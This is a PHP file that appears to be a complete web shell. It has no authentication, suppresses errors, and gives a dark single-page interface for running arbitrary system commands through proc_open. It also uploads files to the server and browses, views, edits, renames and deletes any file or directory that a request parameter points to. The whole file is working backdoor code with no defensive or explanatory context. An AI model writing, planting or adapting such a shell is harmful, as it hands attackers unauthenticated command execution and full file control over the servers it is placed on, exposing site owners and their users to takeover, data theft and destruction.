<?php
@error_reporting(0);@set_time_limit(0);
$p=isset($_GET['p'])?$_GET['p']:getcwd();$p=str_replace('\\','/',$p);if(is_file($p))$p=dirname($p);@chdir($p);
$o='';if(isset($_POST['x'])){$c=$_POST['x'];$h=proc_open($c,[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']],$pp,$p);if(is_resource($h)){$o=stream_get_contents($pp[1]);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($h);}if(!$o)$o='-';}
if(isset($_FILES['f'])){$n=basename($_FILES['f']['name']);echo copy($_FILES['f']['tmp_name'],$p.'/'.$n)?'OK':'FAIL';exit;}
$op=$_GET['o']??'';$fi=$_GET['f']??'';
if($op=='s'&&isset($_POST['c'])){echo file_put_contents($fi,$_POST['c'])!==false?'OK':'FAIL';exit;}
if($op=='r'&&isset($_POST['n'])){echo rename($fi,dirname($fi).'/'.basename($_POST['n']))?'OK':'FAIL';exit;}
if($op=='d'){echo(is_dir($fi)?rmdir($fi):unlink($fi))?'OK':'FAIL';exit;}
?><!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>19</title><style>
*{box-sizing:border-box}body{background:#111;color:#ccc;font:12px monospace;padding:8px;margin:0}a{color:#4fc3f7}pre{background:#000;padding:6px;max-height:200px;overflow:auto}
input,textarea{background:#222;color:#ccc;border:1px solid #444;padding:4px;font:12px monospace}input[type=submit]{background:#333;cursor:pointer}
</style></head><body>
<?php
// Path
$pts=explode('/',trim($p,'/'));$a='';
foreach($pts as $i=>$pt){$a.='/'.$pt;if($i)echo'/';echo'<a href="?p='.$a.'">'.$pt.'</a>';}
echo' | uid:'.getmyuid().'<hr style="border-color:#222;margin:6px 0">';
// CMD
echo'<form method="POST" style="display:flex;gap:4px;margin:4px 0"><input type="text" name="x" style="flex:1" placeholder="cmd"><input type="submit" value=">"></form>';
if($o)echo'<pre>'.htmlspecialchars($o).'</pre>';
// Upload
echo'<form method="POST" enctype="multipart/form-data" style="margin:4px 0"><input type="file" name="f"><input type="submit" value="UP"></form>';
// Edit
if($op=='e'&&$fi){echo'<b>'.basename($fi).'</b> <a href="?p='.urlencode($p).'">[X]</a><form method="POST" action="?o=s&f='.urlencode($fi).'&p='.urlencode($p).'"><textarea name="c" style="width:100%;height:300px">'.htmlspecialchars(file_get_contents($fi)).'</textarea><br><input type="submit" value="Save"></form>';}
// Rename
if($op=='r'&&$fi){echo'<form method="POST" action="?o=r&f='.urlencode($fi).'&p='.urlencode($p).'"><input type="text" name="n" value="'.basename($fi).'"><input type="submit" value="OK"></form>';}
// View
if($op=='v'&&$fi){echo'<b>'.basename($fi).'</b> <a href="?p='.urlencode($p).'">[X]</a><pre>'.htmlspecialchars(file_get_contents($fi)).'</pre>';}
// List
echo'<table style="width:100%;margin-top:6px">';
$items=[];
foreach(scandir($p) as $f){if($f=='.'||$f=='..')continue;$fp=$p.'/'.$f;$d=is_dir($fp);$items[]=['n'=>$f,'p'=>$fp,'d'=>$d,'s'=>$d?0:filesize($fp),'m'=>filemtime($fp)];}
usort($items,function($a,$b){if($a['d']!=$b['d'])return $a['d']?-1:1;return strcasecmp($a['n'],$b['n']);});
foreach($items as $it){$f=$it['n'];$fp=$it['p'];$d=$it['d'];$s=$it['s'];$ss=$d?'-':($s>1048576?round($s/1048576,1).'M':($s>1024?round($s/1024,1).'K':$s));
echo'<tr>';
if($d)echo'<td><a href="?p='.urlencode($fp).'" style="color:#ffd700">'.$f.'/</a></td>';
else echo'<td><a href="?o=v&f='.urlencode($fp).'&p='.urlencode($p).'">'.$f.'</a></td>';
echo'<td style="color:#555;width:50px">'.$ss.'</td><td style="width:140px">';
if($d)echo'<a href="?p='.urlencode($fp).'">O</a> ';
else echo'<a href="?o=v&f='.urlencode($fp).'&p='.urlencode($p).'">V</a> <a href="?o=e&f='.urlencode($fp).'&p='.urlencode($p).'">E</a> ';
echo'<a href="?o=r&f='.urlencode($fp).'&p='.urlencode($p).'">R</a> <a href="?o=d&f='.urlencode($fp).'&p='.urlencode($p).'" onclick="return confirm(\'?\')">D</a></td></tr>';}
if(!$items)echo'<tr><td style="color:#444">Empty</td></tr>';
echo'</table>'?></body></html>
